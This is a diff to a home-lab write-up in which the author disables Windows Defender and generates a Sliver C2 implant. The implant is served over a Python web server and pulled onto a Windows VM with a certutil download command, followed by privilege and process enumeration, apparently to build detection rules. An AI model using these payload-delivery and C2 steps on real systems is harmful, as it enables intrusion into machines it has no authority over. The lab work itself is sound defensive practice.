@@ -40,12 +40,12 @@ monitoring and capturing telemetry, creating and applying detection rules.
 
 ![Disabling WinDefender via Registry Editor](https://github.com/user-attachments/assets/4e244807-80e6-41bd-9445-be3569724400)
 
-### Now that my Windows machine is vulnerable, it's time to SSH into my Ubuntu AttackBox.
+#### Now that my Windows machine is vulnerable, it's time to SSH into my Ubuntu AttackBox.
 
 *Ref 2: Using PuTTY to connect via SSH*
 ![Screenshot 2024-09-02 113412](https://github.com/user-attachments/assets/97f91ab3-c686-439a-b0c2-6c7954162a34)
 
-### Once in my Ubuntu machine I use the _'sudo su'_ command to temporarily gain root access, navigate to the sliver directory and launch Sliver-server.
+#### Once in my Ubuntu machine I use the _'sudo su'_ command to temporarily gain root access, navigate to the sliver directory and launch Sliver-server.
 
 *Ref 3: Launching Sliver-server*
 
@@ -62,23 +62,23 @@ Using the command _'generate --http 192.168.247.129 --save /opt/sliver'_, I gene
 Running the command _'implants'_ above, you’ll see it has created my payload with the random name **GOOD_TWINE**. 
 _We will be using this payload to infect the Windows machine in the next step..._
 
-### I exited Sliver and made sure I was in the sliver directory. 
+#### I exited Sliver and made sure I was in the sliver directory. 
 To download the C2 easily from the Linux VM to the Windows VM I spun up a temporary web server using Python
 
 _'python3 -m http.server 80'_
 
 ![image](https://github.com/user-attachments/assets/14db0600-1b15-4087-a406-707710d04588)
 
-### I switched my attention to the Windows VM and launched an Administrative PowerShell console.
+#### I switched my attention to the Windows VM and launched an Administrative PowerShell console.
 Executing the command _'certutil.exe -f -urlcache http://192.168.247.129/GOOD_TWINE.exe GOOD_TWINE.exe'_ starts the download of my payload.
 
 ![Malware Staged 2](https://github.com/user-attachments/assets/8fd84d5e-a28e-48cd-a13f-abc199bb91e3)
 
 
-
-![Sliver listening on port 80](https://github.com/user-attachments/assets/5fb00e9b-339c-445b-81d8-bc2b414a4008)
-
 ![We are In!](https://github.com/user-attachments/assets/299b4831-809b-474f-8e88-d56db49344c5)
+
+#### Now that we have a live session between the two machines, the attack machine can begin peeking around, checking priveleges, getting host information, and checking what type of security the host has.
+Using _'getprivs'_ and _'ps -T'_
 
 ![Inside the Windows machine](https://github.com/user-attachments/assets/0352ae0d-93e0-47cb-ae54-c729b6974974)
 
@@ -88,9 +88,6 @@ Executing the command _'certutil.exe -f -urlcache http://192.168.247.129/GOOD_TW
 
 ![Implant admin privs on Windows machine](https://github.com/user-attachments/assets/628cf8ab-4473-40b4-9a46-36a155edf91c)
 
-
-### Now that we have a live session between the two machines, the attack machine can begin peeking around, checking priveleges, getting host information, and checking what type of security the host has.
-Using _'getprivs'_ and _'ps -T'_
 
 Part 3 - Emulating an adversary for crafting detections
 
